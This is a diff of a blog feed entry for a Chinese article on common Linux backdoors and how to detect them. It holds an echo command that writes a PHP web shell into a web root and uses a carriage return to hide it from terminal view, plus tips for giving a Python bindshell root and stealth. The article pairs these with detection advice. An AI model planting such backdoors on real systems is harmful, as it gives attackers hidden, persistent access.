@@ -72,7 +72,7 @@
     <link href="http://kevien.github.io/2019/02/16/linux%E5%B8%B8%E8%A7%81backdoor%E5%8F%8A%E6%8E%92%E6%9F%A5%E6%8A%80%E6%9C%AF/"/>
     <id>http://kevien.github.io/2019/02/16/linux常见backdoor及排查技术/</id>
     <published>2019-02-16T13:38:54.000Z</published>
-    <updated>2020-01-03T10:19:08.783Z</updated>
+    <updated>2020-01-03T10:21:35.225Z</updated>
     
     <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">原文已发布至先知平台</div><div class="line">linux常见backdoor及排查技术</div><div class="line">https://xz.aliyun.com/t/4090</div><div class="line">windows常见backdoor、权限维持方法及排查技术</div><div class="line">https://xz.aliyun.com/t/4842</div></pre></td></tr></table></figure>
 <h2 id="TL；DR"><a href="#TL；DR" class="headerlink" title="TL；DR"></a>TL；DR</h2><p><img src="/2019/02/16/linux常见backdoor及排查技术/backdooropen.jpg" alt=""></p>
@@ -109,7 +109,7 @@
 <li>缺点：仍可以看到有vim进程</li>
 <li>排查：检测对应vim进程号虚拟目录的map文件是否有python字眼。<br><img src="/2019/02/16/linux常见backdoor及排查技术/vimbackdoor.png" alt=""></li>
 <li>参考文章<a href="https://github.com/jaredestroud/WOTD/blob/master/%5BDARK%5D%20Weapons%20of%20%20Text%20Destruction.pdf" target="_blank" rel="external">Weapons of Text Destruction.</a><h3 id="python内存端口监听"><a href="#python内存端口监听" class="headerlink" title="python内存端口监听"></a>python内存端口监听</h3>参考<a href="https://gist.github.com/epinna/8ce25ac36a7710cdd1806764c647cf99" target="_blank" rel="external">epinna’s hacked up in-memory Python bindshell.</a></li>
-<li>注意在原脚本基础上可以加上os.setuid(0)，并给python加上suid可以得到root权限的shell<a href="https://threat.tevora.com/a-valiant-effort-at-a-stealthy-backdoor-2/" target="_blank" rel="external">ref</a>，此外如果有web服务器，可以在需要的时候才开启端口监听防止端口一直监听被发现，比较stealthy，参考<a href="https://blog.sevagas.com/HTTP-backdoor-using-POSIX-file-capabilities-and-PHP" target="_blank" rel="external">HTTP backdoor using POSIX file capabilities and PHP</a><h3 id="终端解析-r导致的问题"><a href="#终端解析-r导致的问题" class="headerlink" title="终端解析\r导致的问题"></a>终端解析\r导致的问题</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo -e &quot;&lt;?=\`\$_POST[good]\`?&gt;\r&lt;?=&apos;PHP Test Page &gt;||&lt;                  &apos;;?&gt;&quot; &gt;/var/www/html/test.php</div></pre></td></tr></table></figure>
+<li>注意在原脚本基础上可以加上os.setuid(0)，并给python加上suid可以得到root权限的shell <a href="https://threat.tevora.com/a-valiant-effort-at-a-stealthy-backdoor-2/" target="_blank" rel="external">ref</a>，此外如果有web服务器，可以在需要的时候才开启端口监听防止端口一直监听被发现，比较stealthy，可参考<a href="https://blog.sevagas.com/HTTP-backdoor-using-POSIX-file-capabilities-and-PHP" target="_blank" rel="external">HTTP backdoor using POSIX file capabilities and PHP</a><h3 id="终端解析-r导致的问题"><a href="#终端解析-r导致的问题" class="headerlink" title="终端解析\r导致的问题"></a>终端解析\r导致的问题</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo -e &quot;&lt;?=\`\$_POST[good]\`?&gt;\r&lt;?=&apos;PHP Test Page &gt;||&lt;                  &apos;;?&gt;&quot; &gt;/var/www/html/test.php</div></pre></td></tr></table></figure>
 </li>
 </ul>
 <p><img src="/2019/02/16/linux常见backdoor及排查技术/echo.png" alt=""><br><img src="/2019/02/16/linux常见backdoor及排查技术/terminal.png" alt=""></p>
